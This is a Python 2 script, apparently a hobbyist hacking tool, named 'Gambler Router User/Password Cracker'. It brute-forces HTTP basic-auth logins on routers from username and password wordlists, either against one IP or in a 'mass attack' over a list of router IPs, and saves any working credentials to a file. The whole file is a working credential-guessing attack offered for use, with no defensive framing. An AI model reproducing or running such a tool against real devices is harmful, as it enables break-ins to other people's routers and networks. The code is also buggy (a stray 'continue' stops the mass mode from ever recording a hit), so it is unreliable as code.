import requests
import os

def back():
	r = raw_input('Process Done! Back to menu(y/n):')
	if r == 'y' or r == 'Y':
		os.system('clear')
		menu()
	elif r == 'n' or r == 'N':
		os.system('clear')
		exit()
	else:
		print 'SyntaxError, please provide y or n'
		back()
		
def login_password():
	r = raw_input('Do you want to use default user/password file?(y/n)')
	if r == 'y' or r == 'Y':
		senha_f		= open('wordlist/password.txt','r')
		usuario_f	= open('wordlist/user.txt','r')
		senha_r		= senha_f.read().splitlines()
		usuario_r	= usuario_f.read().splitlines()
		return senha_r,usuario_r
	elif r == 'n' or r == 'N':
		usuario_i = raw_input('Please provide the file with the username(s): ')
		senha_i = raw_input('Please provide the file with the passwords: ')
		senha_f		= open(senha_i,'r')
		usuario_f	= open(usuario_i,'r')
		senha_r         = senha_f.read().splitlines()
                usuario_r       = usuario_f.read().splitlines()
                return senha_r,usuario_r
	else:
		login_password()
		print 'SyntaxError, please provide y or n'

def single():
	senha_f, usuario_f = login_password()
	ip = raw_input('Please provide the router ip to crack: ')
	for user in usuario_f:
		for password in senha_f:
			r = requests.get('http://'+ip, auth=(user, password))
			resp = r.status_code
			print '[+] - HTTP Response ',resp
			print '[+] - Executing brute force - [+]'
			print '[+] - User: '+user
			print '[+] - Password: '+password
			if resp == 200:
				print
				print '[+] - LOGIN FOUNDED'
				print '[+] - HTTP Response ',resp
				print '[+] - User: '+user
				print '[+] - Password: '+password
				print
				response = open('result.txt','w')
				response.write(ip+','+user+','+password)
				response.close()
				back()
	back()

def mass():
	senha_f, usuario_f = login_password()
	
	ip_name = raw_input('Please provide the file with the router IPs to crack: ')
	ips = open(ip_name,'r')
	ipfile = ips.read().splitlines()
	for user in usuario_f:
		for password in senha_f:
			for ip in ipfile:
				r = requests.get('http://'+ip, auth=(user, password))
				resp = r.status_code
				print '[+] - HTTP Response ',resp
				print '[+] - Executing brute force - [+]'
				print '[+] - User: '+user
				print '[+] - Password: '+password
				print '[+] - URL: http://'+ip
				print
				continue
				if resp == 200:
					print
					print '[+] - LOGIN FOUNDED'
					print '[+] - HTTP Response ',resp
					print '[+] - User: '+user
					print '[+] - Password: '+password
					print '[+] - URL: http://'+ip
					print
					response = open('result.txt','w')
					response.write(ip+','+user+','+password)
					response.close()
	menu()
					
def menu():
	print '[+] - Gambler Router User/Password Cracker'
	print '[+] - Desenvolved by The_Gambler'
	print
	print '[1] - Single Attack'
	print '[2] - Mass Attack'
	print '[3] - Exit'
	print
	r = raw_input('Select a option[1-3]: ')
	if r == '1':
		single()
	elif r == '2':
		mass()
	elif r == '3':
		exit()
	else:
		os.system('clear')
		print 'SyntaxError please provide a validy option'
		menu()

def main():
	try:
		os.system('clear')	
		menu()
	except KeyboardInterrupt:	
		main()

main()
